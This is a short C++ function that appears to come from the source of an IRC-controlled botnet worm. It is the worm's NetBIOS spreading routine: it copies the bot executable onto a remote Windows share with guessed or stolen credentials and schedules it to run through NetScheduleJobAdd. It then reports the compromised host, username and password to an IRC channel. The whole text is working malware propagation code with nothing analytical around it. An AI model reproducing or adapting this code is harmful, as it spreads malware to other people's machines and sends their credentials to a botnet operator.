bool CScannerNetBios::StartViaNetScheduleJobAdd(const char *share, const char *host, const char *user, const char *password)
{	char buffer[MAX_PATH]; CString sReply; LPTIME_OF_DAY_INFO pTOD=NULL; AT_INFO at; DWORD dwJobId;
	GetFilename(buffer, MAX_PATH);
	char rem_buffer[MAX_PATH]; sprintf(rem_buffer, "\\\\%s\\%s\\%s", host, share, g_cMainCtrl.m_cBot.bot_filename.sValue.CStr());
	unsigned long lTimeoutStart=GetTickCount();
	while(CopyFile(buffer, rem_buffer, false)==false && GetTickCount()-lTimeoutStart<25000) Sleep(100);

	m_NetApiStatus=NetRemoteTOD(m_wszHost, (LPBYTE*)&pTOD);
	if(m_NetApiStatus==NERR_Success)
	{	WCHAR wszBotRemote[MAX_PATH]; WCHAR wszFilename[MAX_PATH];
		wcscpy(wszBotRemote, m_wszResource);
		MultiByteToWideChar(CP_ACP, 0, g_cMainCtrl.m_cBot.bot_filename.sValue.CStr(), g_cMainCtrl.m_cBot.bot_filename.sValue.GetLength(), wszFilename, (int)sizeof(wszFilename)/(int)sizeof(wszFilename[0]));
		wcscat(wszBotRemote, L"\\");
		wcscat(wszBotRemote, wszFilename);
		memset(&at, 0, sizeof(at));
		at.Command=(LPWSTR)wszBotRemote;
		at.DaysOfMonth=0;
		at.DaysOfWeek=0;
		at.JobTime=pTOD->tod_mins+5;
		m_NetApiStatus=NetScheduleJobAdd(m_wszHost, (LPBYTE)&at, &dwJobId);
		if(m_NetApiStatus==NERR_Success)
		{	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: Exploited \\\\%s\\%s with l/p: %s/%s (NetScheduleJobAdd)!!!", m_sScannerName.CStr(), host, share, user, password);
			return true; }
		else return false; }
	else return false; }